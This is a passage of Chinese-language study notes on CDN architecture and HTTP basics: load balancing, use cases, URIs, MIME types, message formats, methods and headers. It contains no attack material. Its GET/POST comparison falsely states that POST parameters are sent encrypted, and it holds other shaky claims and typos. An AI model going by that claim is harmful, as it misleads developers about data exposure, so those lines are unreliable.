   - 查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。 基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。
3. 全局负载均衡设备把服务器的 IP 地址返回给用户。

#### 1.5.3 组成部分

典型的 CDN 系统由下面三个部分组成：

- **分发服务系统**：最基本的工作单元就是 Cache 设备，Cache（边缘 Cache）负责直接响应最终用户的访问请求，把缓存在本地的内容快速地提供给用户。同时 Cache 还负责与源站点进行内容同步，把更新的内容以及本地没有的内容从源站点获取并保存在本地。Cache 设备的数量、规模、总服务能力是衡量一个 CDN 系统服务能力的最基本的指标。
- **负载均衡系统**：主要功能是负责对所有发起服务请求的用户进行访问调度，确定提供给用户的最终实际访问地址。两级调度体系分为全局负载均衡（GSLB）和本地负载均衡（SLB）。GSLB 主要根据用户就近性原则，通过对每个服务节点进行”最优“判断，确定向用户提供服务的 Cache 的物理位置。SLB 主要负责节点内部的设备负载均衡
- **运营管理系统**：分为运营管理和网络管理子系统，负责处理业务层面的与外界系统交互所必须的收集、整理、交付工作，包含客户管理、产品管理、计费管理、统计分析等功能。

CDN 通常由源站负责内容生产，主干节点负责二级缓存和加速，通常在 BGP 网络。

广义上的内容分发网络可以包含源站一起，甚至多媒体分发（视频）。商业意义上的 CDN 只包含 CDN 提供商的网络，不包含源站。部分 CDN 支持图片及多媒体处理扩展等附加功能：压缩、剪切、水印、鉴黄。

**CDN切面**

![](./img/1-5-3-cnd切面.jpg)

**CDN 数据流向**

![](./img/1-5-3-CDN 数据流向.jpg)

#### 1.5.4 应用场景

##### 1.5.4.1 网站加速

站点或者应用中大量静态资源的加速分发，建议将站点内容进行动静分离，动态文件可以结合云服务器 ECS，静态资源如各类型 HTML、CSS、JS、图片、文件、短视频等，建议结合对象存储 OSS 存储海量静态资源，可以有效加速内容加载速度，轻松搞定网站图片、短视频等内容分发。

![](./img/1-5-4-1-网站加速.png)

建议将 CDN 产品与 OSS 产品结合使用，可以加速资源的加载速度，提高网站图片、短视频等分发效率。

**业务价值：**

- 终端用户访问慢：网站小文件内容多打开速度太慢
- 跨区域访问质量差：终端用户分布在不同区域，不同区域的访问速度和质量高低不一
- 高并发压力大：运营推广期间，源站服务器压力大，容易挂掉，造成服务不可用
- 图片格式分辨率处理复杂：无法根据适合的终端情况进行图片压缩和优化

##### 1.5.4.2 超大文件下载

大文件下载优化加速分发：网站或应用 App 的主要业务为大文件下载，例如：安装包文件 `apk`、音频文件 `mp3`、驱动程序 `exe`、应用更新文件 `zip` 等，平均单个文件大小在 20M 以上，如游戏、各类客户端下载和 App 下载商店等。

![](./img/1-5-4-2-超大文件下载.png)

**业务价值：**

- 终端用户无法下载或者下载太慢。
- 网络环境不稳定时，下载容易中断。重新下载会耗费额外的资源。
- 网站内容不安全，容易被劫持。
- 文件存储成本过高，同时对源站性能要求高。

##### 1.5.4.3 音视频点播

音视频点播优化加速服务：网站或应用 App 的主要业务为视频点播或短视频类。支持例如：`mp4`、`flv`、`rmvb`、`wmv`、`HLS` 等主流视频格式。

视音频点播主要适用于各类视音频站点，如影视类视频网站、在线教育类视频网站、新闻类视频站点、短视频社交类网站以及音频类相关站点和应用。

CDN 支持流媒体协议，例如 RTMP 协议。在很多情况下，这相当于一个代理，从上一级缓存读取内容，转发给用户。由于流媒体往往是连续的，因而可以进行预先缓存的策略，也可以预先推送到用户的客户端。

对于静态页面来讲，内容的分发往往采取 **拉取** 的方式，也即当发现未命中的时候，再去上一级进行拉取。但是，流媒体数据量大，如果出现回源，压力会比较大，所以往往采取主动推送的模式，将热点数据主动推送到边缘节点。

对于流媒体来讲，很多 CDN 还提供 **预处理** 服务，也即文件在分发之前，经过一定的处理。例如将视频转换为不同的码流，以适应不同的网络带宽的用户需求；再如对视频进行分片，降低存储压力，也使得客户端可以选择使用不同的码率加载不同的分片。这就是我们常见的，超清、标清、流畅等。

 **业务价值：**

- 终端用户访问视频时打不开视频或容易卡顿，观看不流畅。
- 上传、转码、存储、分发、播放的开发配置流程复杂，点播服务技术门槛高。
- 视频资源容易被劫持或盗用，版权得不到有效保护。
- 终端客户上传的小视频等内容无法被快速审核，导致政策风险。

##### 1.5.4.4 音视频直播

视频流媒体直播服务，支持媒资存储、切片转码、访问鉴权、内容分发加速一体化解决方案。结合弹性伸缩服务，及时调整服务器带宽，应对突发访问流量；结合媒体转码服务，享受高速稳定的并行转码，且任务规模无缝扩展。

##### 1.5.4.5 边缘程序

传统的 CDN 服务是纯粹的缓存和分发服务，缺乏可以直接提供给您的计算能力。访问 CDN 的海量请求中，复杂的计算逻辑必须回服务器源站执行，这增加了您的服务器消耗以及架构的复杂性。ER 可提供直接在 CDN 边缘节点计算处理的能力，将极大提高 CDN 的可定制化，可编程化，从而大量减少需回源的请求，降低用户的请求延时。同时 CDN 边缘节点拥有天然的高可用、高伸缩、全球负载均衡的特性，边缘的计算服务可应用于更多的使用场景。

- Geo：边缘打点服务，可以采集到边缘节点的请求相关信息：如 IP、地理、设备信息等
- Fetch：边缘代理服务，在 JS 代码中调用内置 api fetch 做了 http 自请求，响应给客户端 fetch 的最终内容
- AB test：AB 测试的功能
- Precache/Prefetch：CDN 预热功能，预热任务在响应客户端时将异步完成
- Race：回源同拉功能，将回源速度最快的源站的内容优先返回给客户端
- Log：边缘日志服务，在响应结束后异步地生成日志并回传给您的 Server
- 3xx：回源 302 跟随功能
- Redirect：边缘请求重定向功能
- Deny bot：边缘反爬虫服务
- Waf：边缘 waf 服务，当满足某些条件时，将禁止该请求

通常，使用了 CDN 后，您可以根据延时、下载速度、打开速度、丢包率、回源率和缓存命中率判断加速效果。

#### 1.5.5 动态 CDN

动态加速针对动态资源进行加速分发。

- **边缘计算的模式**：既然数据是动态生成的，所以 **数据的逻辑计算和存储**，也相应的放在边缘的节点。其中定时从源数据那里同步存储的数据，然后在边缘进行计算得到结果。就像对生鲜的烹饪是动态的，没办法事先做好缓存，因而将生鲜超市放在你家旁边，既能够送货上门，也能够现场烹饪，也是边缘计算的一种体现。
- **路径优化的模式**：数据不是在边缘计算生成的，而是在源站生成的，但是数据的下发则可以通过 CDN 的网络，对路径进行优化。因为 CDN 节点较多，能够找到离源站很近的边缘节点，也能找到离用户很近的边缘节点。中间的链路完全由 CDN 来规划，选择一个更加可靠的路径，使用类似专线的方式进行访问。

对于常用的 TCP 连接，在公网上传输的时候经常会丢数据，导致 TCP 的窗口始终很小，发送速度上不去。根据前面的 TCP 流量控制和拥塞控制的原理，在 CDN 加速网络中可以调整 TCP 的参数，使得 TCP 可以更加激进地传输数据。可以通过多个请求复用一个连接，保证每次动态请求到达时。连接都已经建立了，不必临时三次握手或者建立过多的连接，增加服务器的压力。另外，可以通过对传输数据进行压缩，增加传输效率。所有这些手段就像冷链运输，整个物流优化了，全程冷冻高速运输。不管生鲜是从你旁边的超市送到你家的，还是从产地送的，保证到你家是新鲜的。

#### 1.5.6 刷新预热

- 刷新功能是指提交 URL 刷新或目录刷新请求后，CDN 节点的缓存内容将会被强制过期，当您向 CDN 节点请求资源时，CDN 会直接回源站获取对应的资源返回给您，并将其缓存。刷新功能会降低缓存命中率。
- 预热功能是指提交 URL 预热请求后，源站将会主动将对应的资源缓存到 CDN 节点，当您首次请求时，就能直接从 CDN 节点缓存中获取到最新的请求资源，无需再回源站获取。预热功能会提高缓存命中率。

## 第二章、HTTP

### 2.1 HTTP 超文本传输协议

HTTP 全称是  HyperText Transfer Protocal ，即超文本传输协议。

- HTTP 是 **应用层协议**，当你上网浏览网页的时候，浏览器和 Web 服务器之间就会通过 HTTP 在 Internet 上进行数据的发送和接收。
- HTTP 是一个基于请求/响应模式的、无状态的协议。

![](./img/2-1-浏览器输入URL完整过程.png)

#### 2.1.1 特点

HTTP 的特点概括如下：

1. **灵活可扩展**：主要体现在两个方面。一个是语义上的自由，只规定了基本格式，比如空格分隔单词，换行分隔字段，其他的各个部分都没有严格的语法限制。另一个是传输形式的多样性，不仅仅可以传输文本，还能传输图片、视频等任意数据，非常方便。
2. **可靠传输**：HTTP 基于 TCP/IP，因此把这一特性继承了下来。这属于 TCP 的特性，不具体介绍了。
3. **请求-应答**：也就是一发一收、有来有回， 当然这个请求方和应答方不单单指客户端和服务器之间，如果某台服务器作为代理来连接后端的服务端，那么这台服务器也会扮演请求方的角色。
4. **无状态**：这里的状态是指 **通信过程的上下文信息**，而每次 HTTP 请求都是独立、无关的，默认不需要保留状态信息。

#### 2.1.2 缺点

1. 无状态：在需要长连接的场景中，需要保存大量的上下文信息，以免传输大量重复的信息，那么这时候无状态就是 HTTP 的缺点了。
2. 明文传输：WIFI 陷阱 就是利用 HTTP 明文传输的缺点，诱导你连上热点，然后疯狂抓你所有的流量，从而拿到你的敏感信息。
3. 队头阻塞问题：当 HTTP 开启长连接时，共用一个 TCP 连接，同一时刻只能处理一个请求，那么当前请求耗时过长的情况下，其它的请求只能处于 阻塞状态，也就是著名的队头阻塞问题。

### 2.2 HTTP 资源标识

#### 2.2.1 统一资源标识符 URI

统一资源标志符（Uniform Resource Identifier，简称 URI）是一个用于标识（区分）互联网资源名称的字符串。该种标识允许用户对网络种的资源通过特定的协议进行交互操作。

URI 可以进一步分为 [URL](https://tsejx.github.io/javascript-guidebook/computer-networks/http/http-resource-and-uris#统一资源定位符-url) 和 [URN](https://tsejx.github.io/javascript-guidebook/computer-networks/http/http-resource-and-uris#永久统一资源定位符-urn)。URI 是以一种抽象的，高层次概念定义统一资源标识，而 URL 和 URN 则是具体的资源标识的方式。

##### 2.2.1.1 编码方式

URI 只能使用 ASCII，ASCII 之外的字符是不支持显示的，而且还有一部分符号是界定符，如果不加以处理就会导致解析出错。

因此，URI 引入了 **编码** 机制，将所有 **非 ASCII 码字符** 和 **界定符** 转为十六进制字节值，然后在前面加个 `%`。

如：空格被转义成了 `%20`，**三元** 被转义成了 `%E4%B8%89%E5%85%83`。

##### 2.2.1.2 方案或协议

`http://` 告诉浏览器使用何种协议。对于大部分 Web 资源，通常使用 HTTP 协议或其安全版本 HTTPS 协议。

另外，浏览器也知道如何处理其他协议。例如，

- `mailto`：协议指示浏览器打开邮件客户端
- `ftp`：协议指示浏览器处理文件传输。

| 方案              | 描述                                   |
| ----------------- | -------------------------------------- |
| `data`            | Data URIs                              |
| `file`            | 指定主机上文件的名称                   |
| `ftp`             | 文件传输协议                           |
| `http` 或 `https` | 超文本传输  协议／安全的超文本传输协议 |
| `mailto`          | 电子邮件地址                           |
| `ssh`             | 安全 shell                             |
| `tel`             | 电话                                   |
| `urn`             | 统一资源名称                           |
| `view-source`     | 资源的源代码                           |
| `ws/wss`          | WebSocket 连接                         |

#### 2.2.2 统一资源定位符 URL

统一资源定位符（Uniform Resource Locator，简称 URL）是 URI 最常见的形式，有时候也被俗称为网页地址（网址），如同是网络上的门牌，是因特网上标准的资源的地址。

```plain
https://developer.mozilla.org
https://developer.mozilla.org/en-US/docs/Learn/
https://developer.mozilla.org/en-US/search?q=URL
```

#### 2.2.3 永久统一资源定位符 URN

永久统一资源定位符（Uniform Resource Name，简称 URN）是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。

```http
urn:isbn:9780141036144
urn:ietf:rfc:7230
```

#### 2.2.4 Data URI Scheme

Data URI Scheme，即前缀为 `data:` 协议的 URI，其允许内容创建者向文档中嵌入小文件。

```
data:[<mediatype>][;charset=][;<encoding>],<encoded-data>
```

Data URI Scheme 由四个部分组成：

- 协议头 `data:`：标识这个内容为 Data URI Scheme 资源
- MIME 类型（可选项）：查看下方详细描述
- 源文本的字符集编码方式 `[;charset=<charset>]`：默认编码是 `charset=US-ASCII`，即数据部分的每个字符都会自动编码为 `%xx`
- 数据编码方式 `[;<encoding>]`：默认 `US-ASCII` 和 `BASE64` 两种
- 编码后的数据 `<encoded data>`

**使用 Data URI Scheme 的优劣势**

- 优势
  - 减少 HTTP 请求
  - 当访问外部资源很麻烦或受限时（例如资源服务器 IP 被禁用）
  - 当图片是在服务端用程序动态生成，每个访问用户显示均不同
  - 当图片的体积比较小，占用 HTTP 会话性价比不高
  - 没有图片更新要重新上传，还要清理缓存的问题
- 劣势
  - Base64 编码的数据体积通常为原数据的 4/3，也就是 Data URI Scheme 形式的图片会比二进制格式的图片体积大 1/3
  - Data URI Scheme 形式的图片不会被浏览器缓存，意味着每次访问页面都需要被重新加载
  - 不适合用于懒加载中
  - 移动端性能优先并不适宜用 Data URI Scheme 技术，解码耗费 CPU

#### 2.2.5 MIME 类型

媒体类型（Multipurpose Internet Mail Extensions，简称 MIME 类型）是一种标准，用于表示文档、文件或字节流的性质和格式。在 HTTP 中，HTTP 会从 MIME 类型中取部分标记报文 Body 部分的数据类型，这些类型体现在 `Content-Type` 这个字段，当然这是针对于发送端而言的，接收端想要收到特定类型的数据，也可以使用 `Accept` 字段。

浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理文档。因此服务器设置正确以将正确的 MIME 类型附加到响应对象的头部是非常重要的。

MIME 类型对大小写不敏感，但是传统写法都是小写。

| 类型        | 描述                                                  | 示例                                                         |
| ----------- | ----------------------------------------------------- | ------------------------------------------------------------ |
| text        | 表明文件是普通文件，理论上是人类可读的                | `text/plain` `text/html` `text/css` `text/javascript`        |
| image       | 表明文件某种是图像文件，GIF 动态图也属于 `image` 属性 | `image/gif` `image/png` `image/jpeg` `image/bmp` `image/webp` `iamge/x-icon` `image/vnd.microsoft.icon` `image/svg+xml` |
| audio       | 表明文件是某种音频文件                                | `audio/midi` `audio/mpeg` `audio/webm` `audio/ogg` `audio/wav` |
| video       | 表明文件是某种视频文件                                | `video/webm` `video/ogg`                                     |
| application | 表明文件是某种二进制数据                              | `application/octet-stream` `application/pkcs12` `application/vnd.mspowerpoint` `application/xhtml+xml` `application/xml` `application/pdf` |

#### 2.2.6 复合类型

```unknown
multipart/form-data
multipart/byteranges
```

Multipart 类型表示细分领域的文件类型的种类，经常对于不同的 MIME 类型。这是复合文件的一种表现方式。

- `multipart/form-data`：用于联系 HTML Forms 和 POST 方法
- `multipart/byteranges`：使用状态码 `206 Partial Content` 来发送整个文件的子集，而 HTTP 对不能处理的复合文件使用特殊的方式，将信息直接传送给浏览器

`multipart/form-data` 可用于 HTML 表单从浏览器发送信息给服务器。作为多部分文档格式，它由边界线（由 `--` 开始的字符串）划分出的不同部分组成。每个部分有自己的实体，以及自己的 HTTP 请求头，`Content-Disposition` 和 `Content-Type` 用于文件上传领域。

#### 2.2.7 MIME 嗅探

在却是 MIME 类型或客户端认为文件设置了错误的 MIME 类型时，浏览器可能会通过查看资源来进行 MIME 嗅探。每个浏览器在不同的情况下会执行不同的操作。因为这个操作会有一些安全问题，有的 MIME 类型表示可执行内容而有些是不可执行内容。浏览器可以通过请求头 `Content-Type` 来设置 `X-Content-Type-Options` 以阻止 MIME 嗅探。

### 2.3 HTTP 报文格式

对于 TCP 而言，在传输的时候分为两个部分：TCP 头和数据部分。而 HTTP 报文是面向文本的，报文中的每个字段都是一些 ASCII 码串，各个字段的长度是不确定的。HTTP 有两类报文：**请求报文** 和 **响应报文**。HTTP 请求/响应报文由以下内容组成：

- 请求头
- HTTP 头部字段
- 空行
- 可选的 HTTP 报文主体数据

#### 2.3.1 请求报文

![](./img/2-3-1请求报文.png)

HTTP 的请求报文分为三个部分：

- 请求行
  - 请求方法
  - 请求地址 URL
  - HTTP 协议版本
- 首部行
  - Content-Type
- 空行
- 实体主体

##### 2.3.1.1 请求行

请求行是请求消息的第一行，由三部分组成：

- 请求方法（GET / POST / DELETE / PUT / HEAD）
- 请求资源的 URI 路径
- HTTP 的版本号

```
GET /index.html HTTP/1.1
```

##### 2.3.1.2 请求方法

HTTP/1.1 协议中共定义了八种方法，以不同的方式操作指定的资源。

| 方法名  | 功能                                                         |
| ------- | ------------------------------------------------------------ |
| GET     | 向指定的资源发出 **显示** 请求，使用 GET 方法应该只用在 **读取数据** 上，而不应该用于产生 **副作用** 的操作中。 |
| POST    | 指定资源 **提交数据**，请求服务器进行处理（例如提交表单或者上传文件）。**数据被包含在请求文本中**。这个请求可能会创建新的资源或者修改现有资源，或两者皆有。 |
| PUT     | 向指定资源位置上传其 **最新内容**。                          |
| DELETE  | 请求服务器删除 Request-URI 所标识的资源。                    |
| OPTIONS | 使服务器传回该 **资源支持的所有 HTTP 请求方法**。用 `*` 来代替资源名称，向 Web 服务器发送 OPTIONS 请求，可以测试服务器功能是否正常运作。 |
| HEAD    | 与 GET 方法一样，都是向服务器发出指定资源的请求，只不过服务器将 **不传回资源的本文部分**，它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中 `关于该资源的信息`（原信息或称元数据）。 |
| TRACE   | 显示服务器收到的请求，主要用于测试或诊断。                   |
| CONNECT | HTTP/1.1 中预留给能够将连接改为通道方式的代理服务器。通常用于 SSL 加密服务器的链接（经由非加密的 HTTP 代理服务器）。 |

其中，最常见的是 GET 和 POST 方法，如果是 RESful API 接口规范的话一般会用到 POST、DELETE、GET、PUT（分别对应增删查改）。

**GET 与 POST**

HTTP 协议从未规定 GET/POST 的请求长度限制是多少。对 GET 请求参数的限制是来源与浏览器或 Web 服务器，浏览器或 Web 服务器限制了 URL 的长度。

为了明确这个概念，我们必须再次强调下面几点：

- HTTP 协议 未规定 GET 和 POST 的长度限制
- GET 的最大长度显示是因为 浏览器和 Web 服务器限制了 URI 的长度
- 不同的浏览器和 Web 服务器，限制的最大长度不一样
- 要支持 IE，则最大长度为 2083byte，若只支持 Chrome，则最大长度 8182byte

**性质**

- GET 请求类似于查找的过程，用户获取数据，可以不用每次都与数据库连接，所以可以使用缓存
- POST 不同，POST 做的一般是修改和删除的工作，所以必须与数据库交互，所以不能使用缓存。因此 GET 请求适合于请求缓存

**两种请求方法的对比**

- 从 **缓存** 的角度，GET 请求会被浏览器主动缓存下来，留下历史记录，而 POST 默认不会。
- 从 **编码** 的角度，GET 只能进行 URL 编码，只能接收 ASCII 字符，中文需要 URL 编码，而 POST 没有限制。
- 从 **参数** 的角度，GET 一般放在 URL 中明文传输，因此不安全，而 POST 放在请求体中密文传输，更适合传输敏感信息。
- 从 **幂等性** 的角度，GET 是幂等的，而 POST 不是。（幂等表示执行相同的操作，结果也是相同的）
- 从 **TCP** 的角度，GET 请求会把请求报文一次性发出去，而 POST 会分为两个 TCP 数据包，首先发 `header` 部分，如果服务器响应 100（continue）， 然后发 `body` 部分。（火狐浏览器除外，它的 POST 请求只发一个 TCP 包）

GET 传输数据量限制在 2KB（GET 是通过 URL 提交数据，而 URL 本身对于数据没有限制，但是不同的浏览器对于 URL 是有限制的，比如 IE 浏览器对于 URL 的限制为 2KB，而 Chrome，FireFox 浏览器理论上对于 URL 是没有限制的，它真正的限制取决于操作系统本身），而 POST 对于数据大小是无限制的（真正影响到数据大小的是服务器处理程序的能力）。

##### 2.3.1.3 请求头

请求头中的信息有和缓存相关的头（Cache-Control，If-Modified-Since）、客户端身份信息（User-Agent）等等。

```http
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: keep-alive
Content-Length: 21429
Content-Type: application/json
Host: api.github.com
Origin: https://github.com
Referer: https://github.com/
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
```

**常见的请求 Header**

| 请求头            | 说明                                   |
| ----------------- | -------------------------------------- |
| Accept            | 表示浏览器接受的数据类型               |
| Accept-Encoding   | 表示浏览器接受的数据压缩格式           |
| Host              | 表示当前请求访问的目标地址             |
| Authorization     | 表示用户身份认证信息                   |
| User-Agent        | 表示浏览器类型                         |
| If-Modified-Since | 表示当前请求资源最近一次更新时间       |
| If-None-Match     | 表示当前请求资源最近一次标识的 ETag 值 |
| Cookie            | 表示浏览器保存的 Cookie 信息           |
| Referer           | 表示标识请求引用自哪个地址             |

##### 2.3.1.4 请求体

请求体是 POST 请求方式中的请求参数，以 `key = value` 形式进行存储，多个请求参数之间用 `&` 连接，如果请求当中请求体，那么在请求头当中的 Content-Length 属性记录的就是该请求体的长度。

```http
POST hysj.jsp HTTP/1.1
Host: search.cnipr.com
User-Agent: Mozilla/5.0 (Windows;U;Windows NT 6.9;zh-CN;rv:1.9.1.13)Gecko/20100914 Firefox/3.5.13 (.NET CLR 3.5.30729)
Accept: text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charst: GN2312,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: http://search.cnipr.com/cnipr/zljs/hyjs-biaodan-y.jsp
Content-Length: 405

pageNo=0&pageSize=10&orderNum=306735659327926273&customerMobile=15626000000&startTime=2019-02-01%2000:00:00&endTime=2019-02-25%2014:54:20&status=SUCCESS&source=WECHAT_SHOPPING&canteenId=104&refundStatus=REFUNDED&startPayTime=2019-02-01%2000:00:00&endPayTime=2019-02-25%2014:54:47
```

根据应用场景的不同，HTTP 请求的请求体有三种不同的形式：

1. **任意请求体**：移动开发者常见的，请求体是任意类型的，服务器不会解析请求体，请求体的处理需要自己解析，如 POST、JSON 的时候就是这类
2. **查询字符串**：URL 中 Query String 的格式要求，多个键值对之间用 `&` 连接，键与值之间用 `=` 连接，且只能用 ASCII 字符，非 ASCII 字符需使用 `UrlEncode` 编码
3. **文件上传**：当需要实现 **文件上传** 时，请求体会被分成多个部分，每个字段 / 文件都被首部字段 `Content-Type` 的 **boundary** 指令指定的值分成单独的段，每段以 `--` 加 `boundary` 指令的值开头，然后是该段的描述头，描述头之后空一行接内容，请求结束的标识为 `boundary` 后面加 `--`

![](./img/2-3-1-4-请求体.jpg)

区分是否被当成文件的关键是  `Content-Disposition` 是否包含  `filename`，因为文件有不同的类型，所以还要使用  `Content-Type` 指示文件的类型，如果不知道是什么类型取值可以为 `application/octet-stream` 表示文件是一个二进制的文件，如果不是文件则 `Content-Type` 可以省略。

#### 2.3.2 响应报文

![](./img/2-3-4-响应报文.png)

HTTP 响应的格式上除状态行（第一行）与请求报文的请求行不一样之外，其他的就格式而言是一样的，但排除状态行和请求行的区别，从 Header 上还是可以区分出 HTTP 请求和 HTTP 响应的区别的，怎么区别就要看前面的 Header。

HTTP 的响应报文分为三个部分：

- 状态行
  - HTTP 协议版本
  - 状态码
  - 短语
- 首部行
- 空行
- 实体体

##### 2.3.2.1 状态行

状态码用以表示网页服务器超文本传输协议响应状态的三位数字码。

| 状态码 | 对应信息                                                     |
| ------ | ------------------------------------------------------------ |
| 1XX    | 提示信息，表示请求已接收，继续处理                           |
| 2XX    | 用于表示请求已被成功接收、理解、接收                         |
| 3XX    | 用于表示资源（网页等）被永久转移到其它 URL，也就是所谓的重定向 |
| 4XX    | 客户端错误—请求有语法错误或者请求无法实现                    |
| 5XX    | 服务器端错误—服务器未能实现合法的请求                        |

##### 2.3.2.2 响应头

响应头同样可用于传递一些附加信息。

```http
HTTP/1.0 200 ok
content-type: application/javascript;charset=utf-8
date: Tue, 07 Mar 2017 03:06:14 GMT
sever: Domain Reliability Searver
content-length: 0
x-xss-protection: 1, mode=bloack
x-frame-options: SAMEORIGIN
alt-svc: quic=":443";ma=2592000;v="36,35,34"
```

常见的响应头 Header

| 称                | 作用                                   |
| ----------------- | -------------------------------------- |
| Date              | 表示当前相应资源发送的服务器日期和时间 |
| Last-Modified     | 表示当前响应资源最后被修改的服务器时间 |
| Transfer-Encoding | 表示当前响应资源传输实体的编码格式     |
| Set-Cookie        | 表示设置 Cookie 信息                   |
| Location          | 在重定向中或者创建新资源时使用         |
| Server            | 表示服务器名称                         |

##### 2.3.2.3 响应体

响应体也就是网页的正文内容，一般在响应头中会用 Content-Length 来明确响应体的长度，便于浏览器接收，对于大数据量的正文信息，也会使用 `chunked` 的编码方式。

### 2.4 HTTP 首部字段

HTTP 首部字段用于描述报文。

首部字段的格式特点：

1. 字段名 **不区分大小写**
2. 字段名不允许出现空格，不可以出现下划线 `_`
3. 字段名后必须紧跟着冒号 `:`

#### 2.4.1 报文信息

| 报文形式 | 首部字段名 | 说明                                                   | 示例                                                         |
| -------- | ---------- | ------------------------------------------------------ | ------------------------------------------------------------ |
| 通用     | Date       | 创建报文的日期时间                                     | `Date: Tue, 15 Nov 2010 08:12:31 GMT`                        |
| 请求头   | Origin     | 请求页面的站点地址                                     | `Origin: https://developer.mozilla.org`                      |
|          | Referer    | 请求页面的完整 URL 地址                                | `Referer: https://developer.mozilla.org/en-US/docs/Web/JavaScript` |
|          | Host       | 请求要发送到的资源服务器的主机名和端口号               | `Host: www.taobao.com`                                       |
|          | User-Agent | 用户代理软件的应用类型、操作系统、软件开发商以及版本号 | `User-Agent: Mozilla/5.0 (Linux; X11)`                       |

#### 2.4.2 网络连接

| 报文形式 | 首部字段名 | 说明                                                         | 示例                |
| -------- | ---------- | ------------------------------------------------------------ | ------------------- |
| 通用     | Keep-Alive | 允许消息发送者表示连接的状态，还可以用于设置超时时长和最大请求数 |                     |
|          | Connection | 决定当前事务完成后，是否会关闭网络连接                       | `Connection: close` |

##### 2.4.2.1 Connection

如果取值为 `keep-alive`，网络连接就是持久的，不会关闭，使用对同一服务器的请求可以继续在该连接上完成。

可取值：

- `keep-alive`：表明客户端想要保持该网络连接打开，HTTP/1.1 的请求默认使用一个持久连接。这个请求头列表由头部名组成，这些头将被第一个非透明的代理或者代理间的缓存所移除：这些头定义了发出者和第一个实体之间的连接，而不是和目的地节点间的连接。
- `close`：表明客户端或服务器想要关闭该网络连接，这是 HTTP/1.0 请求的默认值

##### 2.4.2.2 Keep-Alive

`Keep-Alive` 是一个通用消息头，允许消息发送者暗示连接的状态，还可以用来设置超时时长和最大请求数。

系列用逗号隔开的参数，每一个参数由一个标识符和一个值构成，并使用等号 `=` 隔开。下述标识符是可用的：

- `timeout`：指定空闲连接需要保持打开状态的最小时长（以秒为单位）。需要注意的是，如果没有在传输层设置 `keep-alive` TCP message 的话，大于 TCP 层面的超时设置会被忽略。
- `max`：在连接关闭之前，在此连接可以发送的请求的最大值。在非管道连接中，除了 `0` 以外，这个值是被忽略的，因为需要在紧跟着的响应中发送新一次的请求。HTTP 管道连接则可以用它来限制管道的使用。

```http
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Type: text/html; charset=utf-8
Date: Thu, 11 Aug 2016 15:23:13 GMT
Keep-Alive: timeout=5, max=1000
Last-Modified: Mon, 25 Jul 2016 04:32:39 GMT
Server: Apache
```

HTTP 请求启动 KeepAlive 需要服务端配合，Nginx 配置：

```nginx
http {
  # 客户端连接在服务器端保持开启的超时值
  keepalive_timeout  120s 120s;
  # 可以服务的请求的最大数量
  keepalive_requests 10000;
}
```

#### 2.4.3 内容协商

| 报文形式 | 首部字段名       | 说明                                          | 示例                                     |
| -------- | ---------------- | --------------------------------------------- | ---------------------------------------- |
| 请求头   | Accept           | 用于告知服务器客户端可处理的 **媒体类型**     | `Accept: text/plain, text/html`          |
|          | Accept-Charset   | 用于告知服务器客户端可处理的 **字符集类型**   | `Accept-Charset: utf-8, iso-8859-5`      |
|          | Accept-Encoding  | 用于告知服务器客户端可处理的 **内容编码方式** | `Accept-Encoding: gzip, deflate, br`     |
|          | Accept-Language  | 用于告知服务器客户端可处理的 **自然语言**     | `Accept-Language: en,zh`                 |
| 响应头   | Content-Type     | 用于指示资源的 **媒体类型**（MIME 类型）      | `Content-Type: text/html; charset=utf-8` |
|          | Content-Encoding | 用于指示资源的 **编码方式**                   | `Content-Encoding: gzip`                 |
|          | Content-Language | 用于指示资源的 **自然语言**                   | `Content-Language: en,zh`                |
|          | Content-Length   | 用于指示资源的 **体积大小**（单位：字节）     | `Content-Length: 348`                    |
|          | Content-Location | 用于指示要访问的资源通过内容协商后的 URL      | `Content-Location: /index.htm`           |
|          | Content-Range    | 表示数据片段在整个文件中的位置                | `Content-Range: bytes 21010-47021/47022` |

##### 2.4.3.1 压缩方式

当然一般这些数据都是会进行编码压缩的，采取什么样的压缩方式就体现在了发送方的 Content-Encoding 字段上， 同样的，接收什么样的压缩方式体现在了接受方的 Accept-Encoding 字段上。这个字段的取值有下面几种：

- `gzip`：当今最流行的压缩格式
- `deflate`：另外一种著名的压缩格式
- `br`：一种专门为 HTTP 发明的压缩算法

```http
<!-- 发送端 -->
Content-Encoding: gzip;
<!-- 接收端 -->
Accept-Encoding: gzip
```

##### 2.4.3.2 Content-Type

在响应中，`Content-Type` 用于告知客户端实际返回的内容的内容类型。

指令：

- `media-type`：资源或数据的 MIME 类型
- `charset`：字符编码标准
- `boundary`：用于封装消息的多个部分的边界

#### 2.4.4 同源策略

| 报文形式 | 首部字段名                       | 说明                                                         | 示例                                                         |
| -------- | -------------------------------- | ------------------------------------------------------------ | :----------------------------------------------------------- |
| 请求头   | Access-Control-Request-Headers   | （预检请求）列出正式请求中允许的首部信息                     | `Access-Control-Request-Headers: *`                          |
|          | Access-Control-Request-Method    | （预检请求）列出正式请求中允许的请求方法                     | `Access-Control-Request-Method: *`                           |
| 响应头   | Access-Control-Allow-Credentials | 表示是否可以将对请求的响应暴露给页面                         | `Access-Control-Allow-Credentials: true`                     |
|          | Access-Control-Allow-Headers     | （预检请求）列出正式请求中允许的首部信息                     | `Access-Control-Allow-Headers: *`                            |
|          | Access-Control-Allow-Methods     | （预检请求）列出正式请求中允许的请求方法                     | `Access-Control-Allow-Methods: *`                            |
|          | Access-Control-Allow-Origin      | （预检请求）列出正式请求中允许的域名                         | `Access-Control-Allow-Origin: https://developer.mozilla.org` |
|          | Access-Control-Expose-Headers    | （预检请求）列出正式请求中哪些首部可以暴露                   | `Access-Control-Expose-Headers: Content-Length, X-Kuma-Revision` |
